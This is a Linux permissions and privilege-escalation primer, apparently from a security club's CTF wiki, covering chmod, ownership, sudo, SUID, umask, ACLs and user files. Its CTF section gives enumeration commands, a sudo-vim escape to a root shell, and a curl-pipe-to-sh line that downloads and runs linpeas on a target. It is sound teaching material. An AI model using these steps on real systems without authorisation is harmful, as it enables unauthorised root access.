+++
title = "Permissions & Users"
weight = 2
description = "How Linux file permissions and users work, and why misconfigurations lead to privilege escalation."
icon = "fa-solid fa-user-lock"
+++

Linux permissions are how the OS decides who can read, write, or execute a file. Misconfigurations here are a leading cause of privilege escalation.

---

## The Permission Model

Every file has three permission sets: **owner**, **group**, **others**.

```
-rwxr-xr--  1  alice  staff  4096  may 29  file.sh
 ^^^         owner    group
    ^^^      group permissions
       ^^^   everyone else
```

Each set has three bits: **r** (read), **w** (write), **x** (execute).

```bash
ls -la          # see permissions on all files
stat file.txt   # detailed file metadata
```

---

## Changing Permissions

```bash
chmod 755 script.sh     # rwxr-xr-x — owner can do everything, others can read/execute
chmod 644 config.txt    # rw-r--r-- — owner read/write, others read only
chmod +x script.sh      # add execute for everyone
chmod -r file.txt       # remove read for everyone
```

Learn both octal (`755`) and symbolic (`+x`) notation. You will see both in the wild.

---

## Ownership

```bash
chown alice file.txt          # change owner
chown alice:staff file.txt    # change owner and group
chgrp staff file.txt          # change group only
```

---

## sudo and Root

`sudo` runs a command as root. Root has no permission restrictions.

```bash
sudo command            # run as root
sudo -l                 # list what you can sudo as current user
sudo -u otheruser cmd   # run as a different user
su - username           # switch to another user (needs their password)
```

> [!warning] sudo -l is a Privilege Escalation Step
> On a compromised system, `sudo -l` is one of the first things you run. It shows what commands you can execute as root without a password. Misconfigured sudo entries are a common path to root.

The rules live in `/etc/sudoers`. Edit it only with `visudo`, which checks the syntax before it saves, so a typo cannot lock you out. A line with `NOPASSWD:` lets a command run as root with no password. When `sudo -l` shows one on a CTF box, that line is the way to root.

---

## Special Permissions: SUID/SGID

When SUID is set on a binary, it runs as the file's owner, not the caller.

```bash
find / -perm -4000 2>/dev/null    # find SUID binaries
find / -perm -2000 2>/dev/null    # find SGID binaries
```

A SUID binary owned by root that can be manipulated by a low-privilege user is a classic privilege escalation vector. [GTFOBins](https://gtfobins.github.io/) catalogs these.

---

## The Defaults You Did Not Set

A new file is `644` and a new directory is `755`, and you never asked for that. The **umask** decides. It subtracts permissions from the maximum.

```bash
umask          # print it. Usually 022.
umask 077      # new files: owner only, for this shell
```

`/tmp` is writable by everyone, yet you cannot delete another user's file there. That is the **sticky bit**: in a shared directory, only a file's owner can remove it.

```bash
ls -ld /tmp             # drwxrwxrwt. The trailing t is the sticky bit.
chmod +t shared_dir
```

---

## Beyond rwx

Two mechanisms hide permissions that `ls -l` does not show. When root cannot delete a file, look here.

```bash
lsattr file.txt               # extended attributes. 'i' means immutable.
sudo chattr +i file.txt       # nobody can modify or delete it, not even root
sudo chattr -i file.txt       # until you remove the flag

getfacl file.txt              # access control list: per-user rules beyond owner, group, and other
setfacl -m u:alice:rw file.txt
```

A `+` at the end of `ls -l` output (`-rw-r--r--+`) means an ACL is present. Read it before you trust the nine characters. Reference: [chattr(1)](https://man7.org/linux/man-pages/man1/chattr.1.html).

---

## Users and Groups

```bash
whoami                    # current user
id                        # uid, gid, and group memberships
cat /etc/passwd           # all user accounts
cat /etc/group            # all groups
getent passwd username    # info on a specific user
```

`/etc/shadow` stores hashed passwords. Only readable by root.

---

## In CTF Environments

Privilege escalation (privesc) is one of the most common CTF phases on Linux boxes. You land as a low-privilege user and need to get to root.

**Standard privesc enumeration:**
```bash
# What can you sudo?
sudo -l

# SUID binaries — check each against GTFOBins
find / -perm -4000 -type f 2>/dev/null

# Writable files owned by root (scripts called by cron, etc.)
find / -writable -user root -type f 2>/dev/null | grep -v proc

# Cron jobs running as root
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/root 2>/dev/null

# Interesting capabilities
getcap -r / 2>/dev/null
```

**Exploiting a misconfigured sudo entry:**
```bash
# If sudo -l shows: (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'   # drop into a root shell from within vim
```

**GTFOBins workflow:** find a SUID binary or sudo-allowed binary → go to [gtfobins.github.io](https://gtfobins.github.io/) → look up the binary → run the listed exploit.

**Automated enumeration scripts** (use after manual checks):
- [linpeas.sh](https://github.com/peass-ng/PEASS-ng) — comprehensive Linux privesc enumeration
- [linenum.sh](https://github.com/rebootuser/LinEnum) — older but still useful

```bash
# Download and run linpeas on a target (requires internet from victim or file transfer)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

---

## Using AI

**Where it helps on permissions:**

- **Interpreting `sudo -l` output:** Paste the output. Ask "which of these entries can be exploited for privilege escalation?" AI knows GTFOBins and common sudo misconfigurations.
- **Explaining SUID findings:** Paste the list of SUID binaries. Ask which ones are interesting and what attacks apply.
- **chmod math:** "What does chmod 4755 mean?" Faster than calculating mentally.
- **Writing privesc scripts:** "Write a bash script that checks for world-writable cron scripts and SUID binaries and prints a summary." Good starting point.
- **Reading linpeas output:** The output is long and color-coded. Paste sections and ask what to prioritize.

---

> [!info] How the Club Uses This
> TODO: Add privilege escalation scenarios or CTF challenges the club has worked through.

---

**References**

- [GTFOBins](https://gtfobins.github.io/) — SUID/sudo privilege escalation reference
- [Linux Privilege Escalation checklist](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [chmod calculator](https://chmod-calculator.com/)
